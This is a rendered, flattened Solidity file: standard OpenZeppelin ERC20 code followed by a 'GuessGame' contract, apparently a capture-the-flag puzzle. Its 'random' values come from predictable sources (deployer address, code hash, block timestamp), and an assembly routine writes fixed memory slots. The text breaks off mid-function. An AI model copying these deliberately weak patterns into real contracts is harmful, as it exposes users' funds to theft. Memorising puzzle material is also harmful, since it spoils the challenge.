class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// File: openzeppelin-contracts/token/ERC20/IERC20.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Interface of the ERC20 standard as defined in the EIP.</span><br><span class="line"> */</span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the amount of tokens in existence.</span><br><span class="line">     */</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the amount of tokens owned by `account`.</span><br><span class="line">     */</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` tokens from the caller&#x27;s account to `recipient`.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function transfer(address recipient, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the remaining number of tokens that `spender` will be</span><br><span class="line">     * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is</span><br><span class="line">     * zero by default.</span><br><span class="line">     *</span><br><span class="line">     * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Sets `amount` as the allowance of `spender` over the caller&#x27;s tokens.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * IMPORTANT: Beware that changing an allowance with this method brings the risk</span><br><span class="line">     * that someone may use both the old and the new allowance by unfortunate</span><br><span class="line">     * transaction ordering. One possible solution to mitigate this race</span><br><span class="line">     * condition is to first reduce the spender&#x27;s allowance to 0 and set the</span><br><span class="line">     * desired value afterwards:</span><br><span class="line">     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` tokens from `sender` to `recipient` using the</span><br><span class="line">     * allowance mechanism. `amount` is then deducted from the caller&#x27;s</span><br><span class="line">     * allowance.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Emitted when `value` tokens are moved from one account (`from`) to</span><br><span class="line">     * another (`to`).</span><br><span class="line">     *</span><br><span class="line">     * Note that `value` may be zero.</span><br><span class="line">     */</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Emitted when the allowance of a `spender` for an `owner` is set by</span><br><span class="line">     * a call to &#123;approve&#125;. `value` is the new allowance.</span><br><span class="line">     */</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: openzeppelin-contracts/GSN/Context.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * @dev Provides information about the current execution context, including the</span><br><span class="line"> * sender of the transaction and its data. While these are generally available</span><br><span class="line"> * via msg.sender and msg.data, they should not be accessed in such a direct</span><br><span class="line"> * manner, since when dealing with GSN meta-transactions the account sending and</span><br><span class="line"> * paying for execution may not be the actual sender (as far as an application</span><br><span class="line"> * is concerned).</span><br><span class="line"> *</span><br><span class="line"> * This contract is only required for intermediate, library-like contracts.</span><br><span class="line"> */</span><br><span class="line">abstract contract Context &#123;</span><br><span class="line">    function _msgSender() internal view virtual returns (address) &#123;</span><br><span class="line">        return msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _msgData() internal view virtual returns (bytes memory) &#123;</span><br><span class="line">        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691</span><br><span class="line">        return msg.data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: openzeppelin-contracts/token/ERC20/ERC20.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Implementation of the &#123;IERC20&#125; interface.</span><br><span class="line"> *</span><br><span class="line"> * This implementation is agnostic to the way tokens are created. This means</span><br><span class="line"> * that a supply mechanism has to be added in a derived contract using &#123;_mint&#125;.</span><br><span class="line"> * For a generic mechanism see &#123;ERC20PresetMinterPauser&#125;.</span><br><span class="line"> *</span><br><span class="line"> * TIP: For a detailed writeup see our guide</span><br><span class="line"> * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How</span><br><span class="line"> * to implement supply mechanisms].</span><br><span class="line"> *</span><br><span class="line"> * We have followed general OpenZeppelin guidelines: functions revert instead</span><br><span class="line"> * of returning `false` on failure. This behavior is nonetheless conventional</span><br><span class="line"> * and does not conflict with the expectations of ERC20 applications.</span><br><span class="line"> *</span><br><span class="line"> * Additionally, an &#123;Approval&#125; event is emitted on calls to &#123;transferFrom&#125;.</span><br><span class="line"> * This allows applications to reconstruct the allowance for all accounts just</span><br><span class="line"> * by listening to said events. Other implementations of the EIP may not emit</span><br><span class="line"> * these events, as it isn&#x27;t required by the specification.</span><br><span class="line"> *</span><br><span class="line"> * Finally, the non-standard &#123;decreaseAllowance&#125; and &#123;increaseAllowance&#125;</span><br><span class="line"> * functions have been added to mitigate the well-known issues around setting</span><br><span class="line"> * allowances. See &#123;IERC20-approve&#125;.</span><br><span class="line"> */</span><br><span class="line">contract ERC20 is Context, IERC20 &#123;</span><br><span class="line">    mapping (address =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">    string private _name;</span><br><span class="line">    string private _symbol;</span><br><span class="line">    uint8 private _decimals;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Sets the values for &#123;name&#125; and &#123;symbol&#125;, initializes &#123;decimals&#125; with</span><br><span class="line">     * a default value of 18.</span><br><span class="line">     *</span><br><span class="line">     * To select a different value for &#123;decimals&#125;, use &#123;_setupDecimals&#125;.</span><br><span class="line">     *</span><br><span class="line">     * All three of these values are immutable: they can only be set once during</span><br><span class="line">     * construction.</span><br><span class="line">     */</span><br><span class="line">    constructor (string memory name_, string memory symbol_) &#123;</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">        _decimals = 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the name of the token.</span><br><span class="line">     */</span><br><span class="line">    function name() public view returns (string memory) &#123;</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the symbol of the token, usually a shorter version of the</span><br><span class="line">     * name.</span><br><span class="line">     */</span><br><span class="line">    function symbol() public view returns (string memory) &#123;</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the number of decimals used to get its user representation.</span><br><span class="line">     * For example, if `decimals` equals `2`, a balance of `505` tokens should</span><br><span class="line">     * be displayed to a user as `5,05` (`505 / 10 ** 2`).</span><br><span class="line">     *</span><br><span class="line">     * Tokens usually opt for a value of 18, imitating the relationship between</span><br><span class="line">     * Ether and Wei. This is the value &#123;ERC20&#125; uses, unless &#123;_setupDecimals&#125; is</span><br><span class="line">     * called.</span><br><span class="line">     *</span><br><span class="line">     * NOTE: This information is only used for _display_ purposes: it in</span><br><span class="line">     * no way affects any of the arithmetic of the contract, including</span><br><span class="line">     * &#123;IERC20-balanceOf&#125; and &#123;IERC20-transfer&#125;.</span><br><span class="line">     */</span><br><span class="line">    function decimals() public view returns (uint8) &#123;</span><br><span class="line">        return _decimals;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-totalSupply&#125;.</span><br><span class="line">     */</span><br><span class="line">    function totalSupply() public view override returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-balanceOf&#125;.</span><br><span class="line">     */</span><br><span class="line">    function balanceOf(address account) public view override returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-transfer&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `recipient` cannot be the zero address.</span><br><span class="line">     * - the caller must have a balance of at least `amount`.</span><br><span class="line">     */</span><br><span class="line">    function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        _transfer(_msgSender(), recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-allowance&#125;.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-approve&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `spender` cannot be the zero address.</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        _approve(_msgSender(), spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-transferFrom&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event indicating the updated allowance. This is not</span><br><span class="line">     * required by the EIP. See the note at the beginning of &#123;ERC20&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `sender` and `recipient` cannot be the zero address.</span><br><span class="line">     * - `sender` must have a balance of at least `amount`.</span><br><span class="line">     * - the caller must have allowance for ``sender``&#x27;s tokens of at least</span><br><span class="line">     * `amount`.</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Atomically increases the allowance granted to `spender` by the caller.</span><br><span class="line">     *</span><br><span class="line">     * This is an alternative to &#123;approve&#125; that can be used as a mitigation for</span><br><span class="line">     * problems described in &#123;IERC20-approve&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event indicating the updated allowance.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `spender` cannot be the zero address.</span><br><span class="line">     */</span><br><span class="line">    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;</span><br><span class="line">        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Atomically decreases the allowance granted to `spender` by the caller.</span><br><span class="line">     *</span><br><span class="line">     * This is an alternative to &#123;approve&#125; that can be used as a mitigation for</span><br><span class="line">     * problems described in &#123;IERC20-approve&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event indicating the updated allowance.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `spender` cannot be the zero address.</span><br><span class="line">     * - `spender` must have allowance for the caller of at least</span><br><span class="line">     * `subtractedValue`.</span><br><span class="line">     */</span><br><span class="line">    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;</span><br><span class="line">        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves tokens `amount` from `sender` to `recipient`.</span><br><span class="line">     *</span><br><span class="line">     * This is internal function is equivalent to &#123;transfer&#125;, and can be used to</span><br><span class="line">     * e.g. implement automatic token fees, slashing mechanisms, etc.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `sender` cannot be the zero address.</span><br><span class="line">     * - `recipient` cannot be the zero address.</span><br><span class="line">     * - `sender` must have a balance of at least `amount`.</span><br><span class="line">     */</span><br><span class="line">    function _transfer(address sender, address recipient, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(sender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(recipient != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(sender, recipient, amount);</span><br><span class="line"></span><br><span class="line">        _balances[sender] = _balances[sender] - amount;</span><br><span class="line">        _balances[recipient] = _balances[recipient] + amount;</span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /** @dev Creates `amount` tokens and assigns them to `account`, increasing</span><br><span class="line">     * the total supply.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event with `from` set to the zero address.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `to` cannot be the zero address.</span><br><span class="line">     */</span><br><span class="line">    function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _totalSupply = _totalSupply + amount;</span><br><span class="line">        _balances[account] = _balances[account] + amount;</span><br><span class="line">        emit Transfer(address(0), account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Destroys `amount` tokens from `account`, reducing the</span><br><span class="line">     * total supply.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event with `to` set to the zero address.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `account` cannot be the zero address.</span><br><span class="line">     * - `account` must have at least `amount` tokens.</span><br><span class="line">     */</span><br><span class="line">    function _burn(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: burn from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        _balances[account] = _balances[account] - amount;</span><br><span class="line">        _totalSupply = _totalSupply - amount;</span><br><span class="line">        emit Transfer(account, address(0), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.</span><br><span class="line">     *</span><br><span class="line">     * This internal function is equivalent to `approve`, and can be used to</span><br><span class="line">     * e.g. set automatic allowances for certain subsystems, etc.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `owner` cannot be the zero address.</span><br><span class="line">     * - `spender` cannot be the zero address.</span><br><span class="line">     */</span><br><span class="line">    function _approve(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">        emit Approval(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Sets &#123;decimals&#125; to a value other than the default one of 18.</span><br><span class="line">     *</span><br><span class="line">     * WARNING: This function should only be called from the constructor. Most</span><br><span class="line">     * applications that interact with token contracts will not expect</span><br><span class="line">     * &#123;decimals&#125; to ever change, and may work incorrectly if it does.</span><br><span class="line">     */</span><br><span class="line">    function _setupDecimals(uint8 decimals_) internal &#123;</span><br><span class="line">        _decimals = decimals_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Hook that is called before any transfer of tokens. This includes</span><br><span class="line">     * minting and burning.</span><br><span class="line">     *</span><br><span class="line">     * Calling conditions:</span><br><span class="line">     *</span><br><span class="line">     * - when `from` and `to` are both non-zero, `amount` of ``from``&#x27;s tokens</span><br><span class="line">     * will be to transferred to `to`.</span><br><span class="line">     * - when `from` is zero, `amount` tokens will be minted for `to`.</span><br><span class="line">     * - when `to` is zero, `amount` of ``from``&#x27;s tokens will be burned.</span><br><span class="line">     * - `from` and `to` are never both zero.</span><br><span class="line">     *</span><br><span class="line">     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].</span><br><span class="line">     */</span><br><span class="line">    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: contracts/guessgame.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.21;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    function number() pure external returns(uint256)&#123;</span><br><span class="line">        return 10;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyToken is ERC20 &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) &#123;</span><br><span class="line">        _mint(msg.sender,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessGame &#123;</span><br><span class="line">    uint256 private immutable random01;</span><br><span class="line">    uint256 private immutable random02;</span><br><span class="line">    uint256 private immutable random03;</span><br><span class="line">    A private  immutable random04;</span><br><span class="line">    MyToken public immutable mytoken;</span><br><span class="line"></span><br><span class="line">    constructor(A _a) &#123;</span><br><span class="line">        mytoken = new MyToken();</span><br><span class="line"></span><br><span class="line">        random01 = uint160(msg.sender);</span><br><span class="line">        random02 = uint256(keccak256(address(new A()).code));</span><br><span class="line">        random03 = block.timestamp;</span><br><span class="line">        random04 = _a; </span><br><span class="line">        pureFunc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pureFunc() pure internal &#123;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            mstore(0x80,1)</span><br><span class="line">            mstore(0xa0,2)</span><br><span class="line">            mstore(0xc0,32)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint256 _random01, uint256 _random02, uint256 _random03, uint256 _random04) external payable returns(bool)&#123;</span><br><span class="line">    </span><br><span class="line">        if(msg.value &gt; 100 ether)&#123;</span><br><span class="line">            // 100 eth! you are VIP!</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            uint256[] memory arr;</span><br><span class="line">            uint256 money = msg.value;</span><br><span class="line">            